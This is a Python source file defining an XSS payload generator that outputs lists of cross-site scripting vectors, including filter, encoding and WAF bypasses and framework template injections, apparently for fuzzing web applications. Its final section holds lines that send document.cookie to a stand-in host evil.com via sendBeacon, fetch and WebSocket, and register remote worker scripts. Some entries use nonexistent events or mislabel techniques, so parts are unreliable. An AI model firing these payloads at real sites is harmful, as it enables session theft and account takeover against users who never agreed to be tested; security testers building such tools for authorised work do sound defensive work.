from typing import List, Dict
import base64
import html
import urllib.parse

class PayloadGenerator:
    def __init__(self):
        self.basic_vectors = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
        ]
        
    def generate_all_payloads(self) -> List[str]:
        """Generate all categories of payloads"""
        payloads = []
        payloads.extend(self._generate_basic_vectors())
        payloads.extend(self._generate_filter_bypasses())
        payloads.extend(self._generate_dom_based())
        payloads.extend(self._generate_template_injections())
        payloads.extend(self._generate_angular_payloads())
        payloads.extend(self._generate_vue_payloads())
        payloads.extend(self._generate_react_payloads())
        payloads.extend(self._generate_polyglots())
        payloads.extend(self._generate_mutation_based())
        payloads.extend(self._generate_encoding_bypasses())
        payloads.extend(self._generate_waf_bypasses())
        payloads.extend(self._generate_modern_vectors())
        return list(set(payloads))  # Remove duplicates

    def _generate_basic_vectors(self) -> List[str]:
        return [
            # Basic alert vectors
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            # HTML5 vectors
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<picture><source srcset=x onerror=alert(1)></picture>',
            # Input vectors
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            # Link vectors
            '<a href="javascript:alert(1)">click</a>',
            '<a href="" onclick="alert(1)">click</a>',
            # Form vectors
            '<form action="javascript:alert(1)"><input type=submit>',
            '<form onsubmit=alert(1)><input type=submit>',
            # Meta refresh
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        ]

    def _generate_filter_bypasses(self) -> List[str]:
        return [
            # Case variation
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x onerror=alert(1)>',
            # Quotes variation
            '<img src=x onerror="alert(1)">',
            "<img src=x onerror='alert(1)'>",
            # No quotes
            '<img src=x onerror=alert(1)>',
            # Space variation
            '<img/src=x/onerror=alert(1)>',
            # Protocol bypass
            '<a href=\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74:alert(1)>click</a>',
            # Null byte
            '<script\\x00>alert(1)</script>',
            # Unicode escape
            '<script>\\u0061lert(1)</script>',
            # HTML encoding
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            # URL encoding
            '%3Cscript%3Ealert(1)%3C/script%3E',
            # Double encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
        ]

    def _generate_dom_based(self) -> List[str]:
        return [
            # Location based
            'javascript:alert(document.domain)',
            'javascript:alert(document.cookie)',
            # Document write
            '<script>document.write("<img src=x onerror=alert(1)>")</script>',
            # innerHTML
            '<script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
            # eval
            '<script>eval("alert(1)")</script>',
            # setTimeout/setInterval
            '<script>setTimeout("alert(1)",100)</script>',
            '<script>setInterval("alert(1)",100)</script>',
            # window.name
            '<script>alert(window.name)</script>',
            # location.hash
            '<script>alert(location.hash.substring(1))</script>',
            # postMessage
            '<script>window.addEventListener("message",function(e){eval(e.data)})</script>',
        ]

    def _generate_template_injections(self) -> List[str]:
        return [
            # Angular template injection
            '{{constructor.constructor("alert(1)")()}}',
            # Vue template injection
            '{{_c.constructor("alert(1)")()}}',
            # Handlebars
            '{{#with "s" as |string|}}{{{string.sub.apply "alert(1)"}}}{{/with}}',
            # Mustache
            '{{{<script>alert(1)</script>}}}',
            # ERB
            '<%= alert(1) %>',
            # Jade/Pug
            '#{alert(1)}',
        ]

    def _generate_angular_payloads(self) -> List[str]:
        return [
            # Angular expressions
            '{{constructor.constructor("alert(1)")()}}',
            '{{[].pop.constructor("alert(1)")()}}',
            # ng-init
            '<div ng-init="constructor.constructor(\'alert(1)\')()">',
            # ng-bind
            '<div ng-bind="constructor.constructor(\'alert(1)\')()">',
            # Angular events
            '<div ng-click="constructor.constructor(\'alert(1)\')()">',
            # Angular src
            '<img ng-src="x" ng-error="constructor.constructor(\'alert(1)\')()">',
        ]

    def _generate_vue_payloads(self) -> List[str]:
        return [
            # Vue template injection
            '{{_c.constructor("alert(1)")()}}',
            '{{$emit.constructor("alert(1)")()}}',
            # Vue directives
            '<div v-html="\'<img src=x onerror=alert(1)>\'">',
            '<div v-bind:href="\'javascript:alert(1)\'">',
            # Vue events
            '<div v-on:click="constructor.constructor(\'alert(1)\')()">',
            # Vue computed
            '<div :data="constructor.constructor(\'alert(1)\')()">',
        ]

    def _generate_react_payloads(self) -> List[str]:
        return [
            # React dangerouslySetInnerHTML
            '<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}></div>',
            # React href
            '<a href="javascript:alert(1)">click</a>',
            # React events
            '<img src=x onError={() => {alert(1)}} />',
            '<div onClick={() => {alert(1)}}>click</div>',
        ]

    def _generate_polyglots(self) -> List[str]:
        return [
            # Classic polyglot
            'javascript:"/*\'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>',
            # SVG polyglot
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            # Script polyglot
            '";alert(1);//\n`alert(1);//\n<!--\nalert(1);//-->',
            # XML polyglot
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>',
        ]

    def _generate_mutation_based(self) -> List[str]:
        return [
            # DOM clobbering
            '<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>',
            # prototype pollution
            '<script>Object.prototype.toString=()=>alert(1)</script>',
            # mutation events
            '<div onDOMSubtreeModified=alert(1)><div id=x></div></div><script>x.remove()</script>',
            # mutation observer
            '<div id=x tabindex=1 onactivate=alert(1)></div>',
        ]

    def _generate_encoding_bypasses(self) -> List[str]:
        return [
            # Base64
            f'<script>eval(atob("{base64.b64encode(b"alert(1)").decode()}"))</script>',
            # URL encoding
            '<script>eval(decodeURIComponent("' + urllib.parse.quote('alert(1)') + '"))</script>',
            # HTML encoding
            f'<script>eval("{html.escape("alert(1)")}")</script>',
            # Unicode escapes
            '<script>\\u0065\\u0076\\u0061\\u006c("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")</script>',
            # Hex escapes
            '<script>\\x65\\x76\\x61\\x6c("\\x61\\x6c\\x65\\x72\\x74(1)")</script>',
        ]

    def _generate_waf_bypasses(self) -> List[str]:
        return [
            # Newline bypass
            '<script\nx>alert(1)</script\n>',
            # Comment bypass
            '<script/**/src=data:,alert(1)></script>',
            # Protocol bypass
            '<a href="ja\nva\nsc\nript\n:alert(1)">click</a>',
            # Recursive filters bypass
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            # Character set bypass
            '<script>㏂lert(1)</script>',
            # Regex bypass
            '<ſcript>alert(1)</ſcript>',
        ]

    def _generate_modern_vectors(self) -> List[str]:
        return [
            # Modern APIs
            '<script>navigator.sendBeacon("//evil.com/" + document.cookie)</script>',
            '<script>fetch("//evil.com",{method:"POST",body:document.cookie})</script>',
            # Service Workers
            '<script>navigator.serviceWorker.register("evil.js")</script>',
            # WebSocket
            '<script>new WebSocket("ws://evil.com").send(document.cookie)</script>',
            # WebRTC
            '<script>new RTCPeerConnection({iceServers:[{urls:"stun:evil.com"}]})</script>',
            # Shared Workers
            '<script>new SharedWorker("evil.js")</script>',
        ]
